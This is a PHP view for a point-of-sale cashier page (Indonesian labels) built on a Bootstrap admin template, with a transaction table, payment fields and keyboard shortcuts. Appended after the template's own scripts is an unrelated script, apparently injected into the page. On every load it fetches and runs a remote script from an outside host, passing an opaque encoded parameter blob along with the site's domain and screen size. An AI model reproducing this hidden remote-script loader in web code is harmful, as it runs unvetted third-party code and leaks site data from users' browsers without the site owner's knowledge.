<!DOCTYPE html>
<!--
Template Name: Admin Lab Dashboard build with Bootstrap v2.3.1
Template Version: 1.3
Author: Mosaddek Hossain
Website: http://thevectorlab.net/
-->
<!--[if IE 8]>
<html lang="en" class="ie8"> <![endif]-->
<!--[if IE 9]>
<html lang="en" class="ie9"> <![endif]-->
<!--[if !IE]><!-->
<html lang="en">
<!--<![endif]-->
<!-- BEGIN HEAD -->
<head>
    <meta charset="utf-8"/>
    <title> Admin Lab Dashboard</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <meta content="" name="description"/>
    <meta content="" name="author"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_default.css" rel="stylesheet" id="style_color"/>

    <link href="<?php echo site_url(); ?>assets/assets/fancybox/source/jquery.fancybox.css" rel="stylesheet"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/uniform/css/uniform.default.css"/>
    <link href="<?php echo site_url(); ?>assets/assets/fullcalendar/fullcalendar/bootstrap-fullcalendar.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/jqvmap/jqvmap/jqvmap.css" media="screen" rel="stylesheet" type="text/css"/>

</head>
<!-- END HEAD -->
<!-- BEGIN BODY -->
<body class="fixed-top">
<!-- BEGIN HEADER -->
<?php $this->load->view('header.php') ?>
<!-- END HEADER -->
<!-- BEGIN CONTAINER -->
<div id="container" class="row-fluid">
    <!-- BEGIN SIDEBAR -->
    <?php $this->load->view('sidebarKasir.php') ?>
    <!-- END SIDEBAR -->
    <!-- BEGIN PAGE -->
    <div id="main-content">
        <!-- BEGIN PAGE CONTAINER-->
        <div class="container-fluid">
            <!-- BEGIN PAGE HEADER-->
            <div class="row-fluid">
                <div class="span12">
                    <!-- BEGIN THEME CUSTOMIZER-->
                    <?php $this->load->view('admin/themeColor.php') ?>
                    <!-- END THEME CUSTOMIZER-->
                    <!-- BEGIN PAGE TITLE & BREADCRUMB-->
                    <h3 class="page-title">
                        Beranda
                        <small></small>
                    </h3>
                    <ul class="breadcrumb">
                        <li>
                            <a href="#">
                                <i class="icon-home"></i>
                            </a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Lokasi</a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Transaksi</a>
                            <span class="divider-last">&nbsp;</span>
                        </li>
                        <li class="pull-right search-wrap">
                            <form class="hidden-phone" action="search_result.html">
                                <div class="search-input-area">
                                    <input id=" " class="search-query" type="text" placeholder="Search">
                                    <i class="icon-search"></i>
                                </div>
                            </form>
                        </li>
                    </ul>
                    <!-- END PAGE TITLE & BREADCRUMB-->
                </div>
            </div>
            <!-- END PAGE HEADER-->
            <!-- BEGIN PAGE CONTENT-->
            <div id="page" class="dashboard">
                <!--BEGIN NOTIFICATION-->
                <div class="alert alert-info">

                    <?php
                    $tgl = new Datetime();
                    $now = $tgl->format('l, d-m-Y H:i:s');
                    ?>
                    <strong>
                        <?php echo $now; ?>
                    </strong>
                </div>
                <!--END NOTIFICATION-->
                <!-- BEGIN OVERVIEW STATISTIC BARS-->

                <!-- END OVERVIEW STATISTIC BARS-->

                <div class="row-fluid">
                    <div class="span12">
                        <!-- BEGIN MAILBOX PORTLET-->
                        <table class='table table-bordered' id='TabelTransaksi'>
                            <thead>
                            <tr>
                                <th style='width:35px;'>#</th>
                                <th style='width:210px;'>Kode Barang</th>
                                <th>Nama Barang</th>
                                <th style='width:120px;'>Harga</th>
                                <th style='width:75px;'>Qty</th>
                                <th style='width:125px;'>Sub Total</th>
                                <th style='width:40px;'></th>
                            </tr>
                            </thead>
                            <tbody></tbody>
                        </table>
                        <div class='alert alert-info TotalBayar'>
                            <div class="row-fluid">
                                <div class="span9">
                                    <button id='BarisBaru' class='btn btn-default pull-left'>
                                        <i class='fa fa-plus fa-fw'></i>
                                        Baris Baru (F7)
                                    </button>
                                </div>
                                <div class="span3">
                                    <h2>Total :
                                        <span id='TotalBayar'>Rp. 0</span>
                                    </h2>
                                    <input type="hidden" id='TotalBayarHidden'>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="span12">
                        <div class="span7">
                            <textarea name='catatan' id='catatan' class='form-control' rows='2' placeholder="Catatan Transaksi (Jika Ada)" style='resize: vertical; width:83%;'></textarea>

                            <br/>
                            <p>
                                <i class='fa fa-keyboard-o fa-fw'></i>
                                <b>Shortcut Keyboard :</b>
                            </p>
                            <div class='span 12'>
                                <div class='col-sm-6'>F7 = Tambah baris baru</div>
                                <div class='col-sm-6'>F9 = Cetak Struk</div>
                                <div class='col-sm-6'>F8 = Fokus ke field bayar</div>
                                <div class='col-sm-6'>F10 = Simpan Transaksi</div>
                            </div>
                        </div>
                        <div class='col-sm-5'>
                            <div class="form-horizontal">
                                <div class="form-group">
                                    <label class="col-sm-6 control-label">Bayar (F8)</label>
                                    <div class="col-sm-6">
                                        <input type='text' name='cash' id='UangCash' class='form-control' onkeypress='return check_int(event)'>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <label class="col-sm-6 control-label">Kembali</label>
                                    <div class="col-sm-6">
                                        <input type='text' id='UangKembali' class='form-control' disabled>
                                    </div>
                                </div>
                                <BR>
                                <div class='span3'>
                                    <div class='span6' style='padding-right: 0px;'>
                                        <button type='button' class='btn btn-warning btn-block' id='CetakStruk'>
                                            <i class='fa fa-print'></i>
                                            Cetak (F9)
                                        </button>
                                    </div>
                                    <div class="span6">
                                        <button type='button' class='btn btn-primary btn-block' id='Simpan'>
                                            <i class='fa fa-floppy-o'></i>
                                            Simpan (F10)
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!-- END MAILBOX PORTLET-->
                    </div>
                </div>
                <!-- BEGIN OVERVIEW STATISTIC BARS-->


                <div class="span8">
                    <!-- BEGIN SITE VISITS PORTLET-->
                    <!--	<div class="widget">
                            <div class="widget-title">
                                <h4><i class="icon-bar-chart"></i> Line Chart</h4>
                                <span class="tools">
                                <a href="javascript:;" class="icon-chevron-down"></a>
                                <a href="javascript:;" class="icon-remove"></a>
                                </span>
                            </div>
                            <div class="widget-body">
                                <div id="site_statistics_loading">
                                    <img src="img/loading.gif" alt="loading" />
                                </div>
                                <div id="site_statistics_content" class="hide">
                                    <div id="site_statistics" class="chart"></div>
                                </div>
                            </div>
                        </div> -->
                    <!-- END SITE VISITS PORTLET-->
                </div>
            </div>

            <div class="row-fluid">
                <div class="span12">
                    <!-- BEGIN SERVER LOAD PORTLET-->
                    <div class="widget">


                    </div>
                    <!-- END SERVER LOAD PORTLET-->
                </div>
            </div>

            <div class="row-fluid">
                <div class="span12">
                    <!-- BEGIN EXAMPLE TABLE widget-->

                    <!-- END EXAMPLE TABLE widget-->
                </div>
            </div>


            <div class="row-fluid">
                <div class="span7 responsive" data-tablet="span7 fix-margin" data-desktop="span7">
                    <!-- BEGIN CALENDAR PORTLET-->

                    <!-- END CALENDAR PORTLET-->
                </div>
            </div>
        </div>
        <!-- END PAGE CONTENT-->
    </div>
    <!-- END PAGE CONTAINER-->
</div>
<!-- END PAGE -->
</div>
<!-- END CONTAINER -->
<!-- BEGIN FOOTER -->
<div id="footer">
    2013 &copy; Admin Lab Dashboard.
    <div class="span pull-right">
        <span class="go-top"><i class="icon-arrow-up"></i></span>
    </div>
</div>
<!-- END FOOTER -->
<!-- BEGIN JAVASCRIPTS -->
<!-- Load javascripts at bottom, this will reduce page load time -->
<script src="<?php echo base_url(); ?>assets/js/jquery-1.8.3.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/jquery-slimscroll/jquery-ui-1.9.2.custom.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/jquery-slimscroll/jquery.slimscroll.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/fullcalendar/fullcalendar/fullcalendar.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.blockui.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.cookie.js"></script>
<!-- ie8 fixes -->
<!--[if lt IE 9]>
<script src="js/excanvas.js"></script>
<script src="js/respond.js"></script>
<![endif]-->
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/jquery.vmap.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.russia.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.world.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.europe.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.germany.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/maps/jquery.vmap.usa.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jqvmap/jqvmap/data/jquery.vmap.sampledata.js" type="text/javascript"></script>
<script src="<?php echo base_url(); ?>assets/assets/jquery-knob/js/jquery.knob.js"></script>
<!-- <script src="assets/flot/jquery.flot.js"></script> -->
<script src="<?php echo base_url(); ?>assets/assets/flot/jquery.flot.resize.js"></script>

<script src="<?php echo base_url(); ?>assets/assets/flot/jquery.flot.pie.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/flot/jquery.flot.stack.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/flot/jquery.flot.crosshair.js"></script>

<script src="<?php echo base_url(); ?>assets/js/jquery.peity.min.js"></script>
<script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/uniform/jquery.uniform.min.js"></script>
<script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/data-tables/jquery.dataTables.js"></script>
<script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/data-tables/DT_bootstrap.js"></script>

<script src="<?php echo base_url(); ?>assets/js/scripts.js"></script>
<script>
    jQuery(document).ready(function () {
        // initiate layout and plugins
        App.setMainPage(true);
        App.init();
    });
</script>
<!-- END JAVASCRIPTS -->
<script type="text/javascript">if (self == top)
    {
        function netbro_cache_analytics(fn, callback)
        {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn)
        {
            fn();
        }

        function requestCfs()
        {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r   = Math.floor(Math.random() * 99999999999);
            var url         = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCo3tr%2fhGc2D%2fInIsAo2jh4sOfFtyDaZnVywFAVh1U%2fVRcrbxgjM2m8poDPNxotq21S3PRrvxy19M92oP7S8M0NH%2bPniGoiqp4mqSZPOs6BaIoFPoyNAcZ2rc%2fQ%2fEz6d9b5efudH7y8uJl%2b3vx1mZDldGer6zgdZYZCm%2f3h6yei%2fg5SzNw1RFJD5BmjBUwhpyE7WSmEsGHLxC%2b9L%2bxE00RnO6igQ1x58YaGKmT6L2CSnTLbdA1tWfLDglwut4ZWhCsq6rSpxafYFct0PHiU8v0zK%2fW1GRpbV%2bJD1qZJ1DcKNbUCva8yj2jYeRvgR8sbGZaBk3H2QPw2z2upGKaCYODO1yYHerNRM027bNjIVZjYwyhatpC9N98QpbG6WxfttQNdGiLqiwpJbw%2beFADORWjSR3JneCdVv33gY0FMLLNPTiQhFboHiiD1siUP3HxdJcC9CV1gcZfeil7MK78AAfU9Sk6G%2fB9NKhhDaW44W7kgUfG4jnTaanzDCERPED%2bNZb2I%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa         = document.createElement('script');
            bsa.type        = 'text/javascript';
            bsa.async       = true;
            bsa.src         = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
</script>
</body>
<!-- END BODY -->
</html>
